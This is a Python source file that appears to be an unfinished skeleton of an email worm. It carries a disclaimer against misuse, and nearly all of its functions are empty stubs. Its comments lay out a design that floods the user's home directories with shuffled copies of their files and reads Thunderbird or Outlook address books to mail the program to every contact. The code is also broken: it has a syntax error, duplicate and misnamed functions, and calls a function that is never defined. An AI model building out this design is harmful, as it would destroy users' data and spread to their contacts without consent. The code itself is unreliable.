#!/usr/bin/python

"""
filewriter.py

(c) 2022 telekobold <mail@telekobold.de>

This program was written solely for the joy of exploring how things work
and the intension of sharing accumulated experiences with others. Please
do not abuse it to cause any harm!
"""


# --------------------------------------------------------------------------
# ------------------------------- imports ----------------------------------
# --------------------------------------------------------------------------

import os



# --------------------------------------------------------------------------
# --------------------------- global variables -----------------------------
# --------------------------------------------------------------------------

FILES_TO_WRITE_PER_DIR = 10




# --------------------------------------------------------------------------
# ----------------------- payload helper functions -------------------------
# --------------------------------------------------------------------------

# Returns the user's home directory
def users_home_dir():
    pass

def payload_helper(cur_dir):
    pass
    # for file : current_dir
    ### if file is a dir that's not .. or ., recursively call browse_dirs(file)
    ### if file is a normal file
    ### Perform each of the following file checks using the file name extension (e.g. ".txt"), the MIME type, and the magic number (MIME sniffing)
    ##### if file is a text file, produce FILES_TO_WRITE_PER_DIR new files where each file contains the content of this text file, but with randomly shuffled content.
    ##### if file is a .doc or .docx file, do the same as for text files.
    ##### if file is a .odt file, do the same as for text files.
    ##### if file is a picture (.png, .jpeg, .jpg), try to recognize content from file name and load similar pictures from the internet (startpage search)
    ##### if file is a music file (.mp3, .ogg, ...), do the same as for pictures
    
def process_picture():
    # NOTE: Maybe, it is useful to split this function into a function for PNG, JPEG, etc., or even to merge it with the function for processing DOC(X) files.
    pass

def process_doc():
    pass

def process_picture():
    pass

def process_music():
    pass



# --------------------------------------------------------------------------
# ---------------------- send mail helper functions ------------------------
# --------------------------------------------------------------------------

    
def read_mails_thunderbird():
    pass

def send_mails_thunderbird():
    pass

def read_mails_outlook():
    pass

def send_mails_thunderbird:
    pass



# --------------------------------------------------------------------------
# -------------------------- main functionality ----------------------------
# --------------------------------------------------------------------------

"""
Search all directories and subdirectoris beginning with the passed dir, 
read all files of every browsed directory,
and create FILES_TO_WRITE_PER_DIR new files for every read file
where each file has a randomly generated filename based on the filename of the read file
and containing the content of the read file, but with the words randomly shuffled.
"""
def payload():
    print("Started browsing dirs...") # test output
    browse_dirs(users_home_dir())
    print("Finished browsing dirs!") # test output

    
"""
Send this program to all email addresses in the address book of the installed Thunderbird or Outlook.
"""
def send_mail():
    pass
    # If Mozilla Thunderbird is installed, read the whole address book from Thunderbird (SQLite database) and send this program to each address of the address book
    # If Outlook is installed, do the same for Outlook. This check only needs to be done if the operating system is Windows.


if __name__ == "__main__":
    payload()
    send_mail()
